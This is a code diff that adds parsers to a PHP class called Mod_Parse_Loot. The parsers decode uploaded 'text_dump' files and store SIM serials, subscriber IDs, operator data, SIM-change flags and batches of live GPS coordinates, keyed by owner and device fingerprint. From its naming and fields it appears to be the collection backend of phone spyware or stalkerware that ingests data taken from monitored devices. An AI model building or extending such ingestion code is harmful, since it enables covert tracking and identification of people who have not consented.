@@ -653,4 +653,137 @@ class Mod_Parse_Loot extends Model
             return false;
         }
     }
+
+    // ═════════════════════════════════════════════════════════════════════
+    //  Sim Configs
+    // ═════════════════════════════════════════════════════════════════════
+
+    public function parse_sim_configs(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) {
+                log_message('error', 'parse_sim_configs: failed to read file: ' . $file_name);
+                return false;
+            }
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) {
+                log_message('error', 'parse_sim_configs: failed to decode: ' . $file_name);
+                return false;
+            }
+
+            $json = json_decode($decoded, true);
+            if ($json === null) {
+                log_message('error', 'parse_sim_configs: invalid JSON: ' . $file_name);
+                return false;
+            }
+
+            $extractedAt = $json['extracted_at'] ?? null;
+            $recordsInserted = 0;
+
+            $entries = $json['sim_configs'] ?? $json['sim_config'] ?? [$json];
+            if (isset($entries['sim_serial']) || isset($entries['subscriber_id'])) {
+                $entries = [$entries];
+            }
+
+            foreach ($entries as $entry) {
+                $data = [
+                    'owner_id'        => $ownerId,
+                    'device_id'       => $devicePrint,
+                    'sim_serial'      => $entry['sim_serial'] ?? null,
+                    'subscriber_id'   => $entry['subscriber_id'] ?? null,
+                    'sim_operator_name' => $entry['sim_operator_name'] ?? $entry['operator_name'] ?? null,
+                    'sim_country_iso'   => $entry['sim_country_iso'] ?? $entry['country_iso'] ?? null,
+                    'sim_state'       => $entry['sim_state'] ?? $entry['state'] ?? null,
+                    'phone_type'      => $entry['phone_type'] ?? $entry['phoneType'] ?? null,
+                    'is_sim_changed'  => !empty($entry['is_sim_changed']) ? 1 : 0,
+                    'captured_at'     => $entry['captured_at'] ?? $entry['timestamp'] ?? $extractedAt,
+                    'extracted_at'    => $extractedAt,
+                    'created_at'      => $dated,
+                    'updated_at'      => $dated,
+                ];
+
+                if ($this->db->table('tbl_sim_configs')->insert($data)) {
+                    $recordsInserted++;
+                }
+            }
+
+            return $recordsInserted;
+
+        } catch (\Exception $e) {
+            log_message('error', 'parse_sim_configs exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    // ═════════════════════════════════════════════════════════════════════
+    //  Live Locations (batch GPS points)
+    // ═════════════════════════════════════════════════════════════════════
+
+    public function parse_live_locations(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) {
+                log_message('error', 'parse_live_locations: failed to read file: ' . $file_name);
+                return false;
+            }
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) {
+                log_message('error', 'parse_live_locations: failed to decode: ' . $file_name);
+                return false;
+            }
+
+            $json = json_decode($decoded, true);
+            if ($json === null) {
+                log_message('error', 'parse_live_locations: invalid JSON: ' . $file_name);
+                return false;
+            }
+
+            $extractedAt = $json['extracted_at'] ?? null;
+            $recordsInserted = 0;
+
+            $points = $json['points'] ?? $json['locations'] ?? [];
+            if (empty($points) && isset($json['latitude'])) {
+                $points = [$json];
+            }
+
+            foreach ($points as $pt) {
+                $locationData = [
+                    'owner_id'      => $ownerId,
+                    'device_id'     => $devicePrint,
+                    'latitude'      => $pt['latitude'] ?? $pt['lat'] ?? null,
+                    'longitude'     => $pt['longitude'] ?? $pt['lon'] ?? $pt['lng'] ?? null,
+                    'accuracy'      => $pt['accuracy'] ?? null,
+                    'altitude'      => $pt['altitude'] ?? $pt['alt'] ?? null,
+                    'bearing'       => $pt['bearing'] ?? null,
+                    'speed'         => $pt['speed'] ?? null,
+                    'provider'      => $pt['provider'] ?? null,
+                    'location_time' => $pt['time'] ?? $pt['timestamp'] ?? $pt['captured_at'] ?? null,
+                    'status'        => $pt['status'] ?? (isset($pt['latitude']) ? 'success' : 'no_location_found'),
+                    'extracted_at'  => $extractedAt,
+                    'created_at'    => $dated,
+                    'updated_at'    => $dated,
+                ];
+
+                if ($this->db->table('tbl_location')->insert($locationData)) {
+                    $recordsInserted++;
+                }
+            }
+
+            return $recordsInserted;
+
+        } catch (\Exception $e) {
+            log_message('error', 'parse_live_locations exception: ' . $e->getMessage());
+            return false;
+        }
+    }
 }
